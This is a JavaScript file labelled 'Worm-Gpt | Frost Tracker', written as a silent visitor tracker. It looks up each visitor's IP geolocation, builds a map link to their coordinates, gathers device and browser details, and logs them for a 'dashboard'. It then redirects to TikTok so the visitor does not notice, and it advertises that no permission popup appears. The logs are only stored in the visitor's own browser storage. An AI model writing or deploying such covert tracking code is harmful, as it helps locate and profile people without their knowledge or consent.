// Worm-Gpt | Frost Tracker | Silent Tracking - No Permission Popup
// Redirect to TikTok after tracking

(async function() {
    const ipData = await getIPGeo();
    const data = {
        timestamp: new Date().toISOString(),
        ip: ipData.ip,
        location: {
            city: ipData.city,
            region: ipData.region,
            country: ipData.country,
            lat: ipData.lat,
            lon: ipData.lon,
            isp: ipData.org,
            mapLink: `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`
        },
        device: getDeviceInfo(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || "Direct",
        url: window.location.href
    };

    // Save to localStorage for dashboard
    let logs = JSON.parse(localStorage.getItem("tracker_logs") || "[]");
    logs.unshift(data);
    localStorage.setItem("tracker_logs", JSON.stringify(logs.slice(0, 100)));

    // Redirect to TikTok after tracking
    setTimeout(() => {
        window.location.href = "https://www.tiktok.com";
    }, 1500);
})();

async function getIPGeo() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip,
            city: data.city || "Tidak diketahui",
            region: data.region || "Tidak diketahui",
            country: data.country_name || "Tidak diketahui",
            lat: data.latitude || 0,
            lon: data.longitude || 0,
            org: data.org || "Tidak diketahui"
        };
    } catch (error) {
        try {
            const res = await fetch('http://ip-api.com/json/');
            const data = await res.json();
            return {
                ip: data.query,
                city: data.city || "Tidak diketahui",
                region: data.regionName || "Tidak diketahui",
                country: data.country || "Tidak diketahui",
                lat: data.lat || 0,
                lon: data.lon || 0,
                org: data.isp || "Tidak diketahui"
            };
        } catch {
            return {
                ip: "Tidak terdeteksi",
                city: "Gagal ambil data",
                region: "-",
                country: "-",
                lat: 0,
                lon: 0,
                org: "-"
            };
        }
    }
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let os = "Unknown";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";

    let browser = "Unknown";
    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Edg")) browser = "Edge";

    return {
        os: os,
        browser: browser,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency || "?",
        deviceMemory: navigator.deviceMemory || "?"
    };
 }
